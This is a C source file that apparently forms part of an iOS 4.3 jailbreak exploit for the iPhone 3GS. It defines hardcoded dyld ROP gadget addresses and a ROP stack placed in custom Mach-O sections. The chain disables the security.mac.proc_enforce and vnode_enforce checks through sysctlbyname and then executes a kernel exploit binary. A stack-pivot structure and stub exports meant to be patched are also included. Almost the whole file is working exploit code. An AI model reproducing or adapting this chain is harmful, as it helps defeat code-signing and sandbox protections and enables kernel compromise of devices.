#include <stdio.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <unistd.h>

//hardcoded for 3GS 4.3b2 dyld with aslr disabled
#define GADGET_BRANCHR4		    0x2FE07D32 + 1
#define GADGET_POP810114567PC	0x2FE01290 + 1
#define GADGET_POP4567PC		0x2FE01290 + 4 + 1
#define GADGET_MOVR3R5BLXR4	    0x2FE11B0C + 1
#define GADGET_SETUPR0R3	    0x2FE01CAA + 1
#define GADGET_BLEH     	    0x2FE07D3E + 1

#define PIVOT_PLACEHOLDER       0xDEADB1F7

#define KERNEL_EXPLOIT_BIN      "/usr/lib/kern_sploit"

char kernel_exploit_bin[] = KERNEL_EXPLOIT_BIN;
unsigned int zero = 0;
char* execve_params[] = {kernel_exploit_bin, NULL};

//dummy structure required by GADGET_SETUPR0R3
struct plus40
{
	unsigned char pad[0x40];
	unsigned int nextGadget;
};
struct plus40 myPlus40 = {{0}, GADGET_POP4567PC};

struct ropstack
{
	unsigned int r4r5r6r7pc[5];
	unsigned int r8r10r11r4r5r6r7pc[8];
	unsigned int _r4r5r6r7pc[5];
	unsigned int r4r5r7pc[4];
};

#define ropcall(func,p0,p1,p2,p3, thisStruct) \
	{ \
		{GADGET_POP810114567PC, &myPlus40, 6, 7, GADGET_MOVR3R5BLXR4}, \
		{8, p3, 11, p0, p2, GADGET_POP4567PC, 7, GADGET_SETUPR0R3}, \
		{func, GADGET_BLEH, p1, &(thisStruct.r4r5r7pc[2]), GADGET_BRANCHR4}, \
		{4,5,7,GADGET_POP4567PC} \
	}
	
//coolest way to write rop code :)
struct ropstack __attribute__((section("__ROP,__ROP"))) myROPstack[]={
	ropcall(sysctlbyname, "security.mac.proc_enforce", 0, 0, &zero, myROPstack[0]),
	ropcall(perror, "sysctlbyname fail?", 0, 0, 0, myROPstack[1]),
	ropcall(sysctlbyname, "security.mac.vnode_enforce", 0, 0, &zero, myROPstack[2]),
	ropcall(perror, "sysctlbyname fail?", 0, 0, 0, myROPstack[3]),
	ropcall(execve, kernel_exploit_bin, &execve_params[0], &zero, 0, myROPstack[4]),
	{{4,5,6,7,_exit},{0}}
	
};

//required for comex's (flat) interposition stack pivot
struct stackONE
{
    unsigned char pad [0x1654];
    unsigned int r0r1r2r3[4];   //this needs to be at 0x11131654
};

struct stackONE __attribute__((section("__ONE,__ONE"))) myStackOne = {
    {0}, 
    {0,0, ((unsigned int)&myROPstack) + 0xC, PIVOT_PLACEHOLDER}    
};

//we patch those exports later
int getpid(void){}
void unsetenv() {}
void launch_data_new_errno(){}
void setrlimit(){}
void _exit(int code){}
void audit_token_to_au32(){}
void launch_data_unpack(){}
void launch_data_dict_iterate(){}
void strlcpy(){}
void pthread_detach(){}
void stat(){}